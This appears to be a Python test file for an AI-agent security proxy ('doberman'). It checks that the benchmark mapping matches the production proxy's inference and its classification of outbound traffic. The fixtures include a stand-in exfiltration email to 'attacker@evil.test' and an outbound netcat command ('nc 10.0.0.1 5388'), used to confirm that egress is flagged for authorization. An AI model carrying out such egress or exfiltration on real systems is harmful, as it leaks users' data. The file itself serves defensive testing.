"""Harness-fidelity tests (two-hosts W-A0.1 + W-A0.2; H1 egress-classification parity).

A0.1 — the benchmark ``mapping`` runs the same generic inference the proxy runs
in production (``proxy.normalize``), so the engine sees a populated ``algebra`` /
``reversibility`` instead of a default all-unknown object. Without this, whole
classes of algebra-keyed guardrails (the lethal-trifecta floor, capability/
reversibility rules) are silently un-exercised by every benchmark.

A0.2 — the runner honors a ``mode`` override so a suite can be swept across the
four F6 strength modes.

H1 — ``to_security_object`` also borrows destination classification from the
same extractor ``doberman.proxy.normalize`` runs in production, so a bare
``nc host port``-shaped command benchmarks the way the live proxy actually
classifies it (``ExternalDestinationRule`` -> AUTH ``egress_requires_auth``)
instead of silently under-reporting it as PASS.

Stub pipelines only; no dependence on which concrete rules fire.
"""

from __future__ import annotations

from doberman.models import (
    ActionType,
    Algebra,
    Decision,
    DestinationClass,
    EvalContext,
    GuardrailResult,
    Provenance,
    ReasonCode,
    Risk,
    SecurityObject,
    SourceContext,
    Verdict,
)
from doberman.proxy.normalize import normalize
from doberman.subjective.adapters import apply_adapters
from doberman.subjective.infer import infer_algebra, infer_reversibility
from tests.benchmarks.adapter import BenchmarkCase, CandidateAction
from tests.benchmarks.mapping import BENCHMARK_TS, to_eval_context, to_security_object
from tests.benchmarks.profiles import build_pipeline
from tests.benchmarks.runner import run_suite

# --- A0.1: the mapping runs production inference ----------------------------


def _egress_action(source_context: SourceContext) -> CandidateAction:
    return CandidateAction(
        action_type=ActionType.network_request,
        tool_name="send_email",
        target="attacker@evil.test",
        external_destination="attacker@evil.test",
        source_context=source_context,
        raw_arguments={"to": "attacker@evil.test", "body": "exfil"},
    )


def test_mapping_populates_inferred_algebra_not_default():
    # Pre-fix the mapping fed a default all-unknown Algebra, so provenance was
    # `unknown` and the destination `none` — the trifecta legs could never line
    # up. Post-fix the same inference the proxy runs populates them.
    so = to_security_object("agentdojo:x:0", _egress_action(SourceContext.tool_output))
    assert so.algebra != Algebra()
    assert so.algebra.provenance is Provenance.mixed
    assert so.algebra.destination_class is DestinationClass.unknown_external


def test_mapping_mirrors_production_inference():
    action = _egress_action(SourceContext.tool_output)
    so = to_security_object("aid", action)
    base = SecurityObject(
        id="aid",
        ts=BENCHMARK_TS,
        agent_role=action.agent_role,
        action_type=action.action_type,
        tool_name=action.tool_name,
        target=action.target,
        external_destination=action.external_destination,
        source_context=action.source_context,
    )
    raw = dict(action.raw_arguments)
    expected = apply_adapters(
        infer_algebra(base, raw), {"tool_name": action.tool_name, "arguments": raw}
    )
    assert so.algebra == expected
    assert so.reversibility == infer_reversibility(base, raw)


def test_mapping_provenance_tracks_source_context():
    # A trusted user instruction must not read as mixed/untrusted provenance.
    so = to_security_object("aid", _egress_action(SourceContext.user))
    assert so.algebra.provenance is Provenance.trusted_instruction


# --- A0.2: run_suite honors a mode override --------------------------------


class _ModeRecorder:
    """Stub pipeline recording the ``EvalContext.mode`` it is handed."""

    name = "mode-recorder"

    def __init__(self) -> None:
        self.modes: list[str] = []

    def decide(self, action: SecurityObject, ctx: EvalContext) -> Decision:
        self.modes.append(ctx.mode)
        return Decision(
            action_id=action.id,
            final_verdict=Verdict.PASS,
            final_risk=Risk.low,
            objective=GuardrailResult(verdict=Verdict.PASS, risk=Risk.low),
            decided_at=BENCHMARK_TS,
        )


class _OneActionAdapter:
    suite_name = "stub"

    def load(self):
        return (
            BenchmarkCase(
                case_id="c0",
                label="benign",
                actions=(CandidateAction(action_type=ActionType.file_read, tool_name="read"),),
                note="stub",
            ),
        )


def test_run_suite_mode_override_threads_to_eval_context():
    rec = _ModeRecorder()
    run_suite(_OneActionAdapter(), rec, mode="paranoid")
    assert rec.modes == ["paranoid"]


def test_run_suite_mode_none_uses_case_default():
    rec = _ModeRecorder()
    run_suite(_OneActionAdapter(), rec, mode=None)
    assert rec.modes == ["balanced"]  # CandidateAction.mode default


# --- H1: command egress classified like the proxy ---------------------------


def test_shell_command_without_adapter_destination_is_classified_like_the_proxy():
    raw_arguments = {"command": "nc 10.0.0.1 5388"}
    action = CandidateAction(
        action_type=ActionType.shell_exec,
        tool_name="shell_exec",
        raw_arguments=raw_arguments,
    )
    obj = to_security_object("case-1", action)

    proxy_obj = normalize("bash", dict(raw_arguments))
    assert obj.external_destination == proxy_obj.external_destination
    egress_keys = {"egress_ambiguous", "egress_embedded_credentials", "egress_implied_registry"}
    for key in egress_keys & proxy_obj.metadata.keys():
        assert obj.metadata.get(key) == proxy_obj.metadata[key]


def test_adapter_destination_is_never_overridden():
    action = CandidateAction(
        action_type=ActionType.shell_exec,
        tool_name="shell_exec",
        external_destination="adapter.example",
        raw_arguments={"command": "nc 10.0.0.1 5388"},
    )
    obj = to_security_object("case-2", action)
    assert obj.external_destination == "adapter.example"


def test_non_command_action_is_untouched():
    action = CandidateAction(
        action_type=ActionType.file_write,
        tool_name="file_write",
        raw_arguments={"path": "x"},
    )
    obj = to_security_object("case-3", action)
    assert obj.external_destination is None
    assert obj.metadata == {}


def test_stateless_decision_on_nc_matches_proxy():
    action = CandidateAction(
        action_type=ActionType.shell_exec,
        tool_name="shell_exec",
        raw_arguments={"command": "nc 10.0.0.1 5388"},
    )
    obj = to_security_object("case-4", action)
    ctx = to_eval_context(action)

    pipeline = build_pipeline(load_plugins=False)
    decision = pipeline.decide(obj, ctx)

    assert decision.final_verdict is Verdict.AUTH
    assert ReasonCode.egress_requires_auth in decision.reason_codes
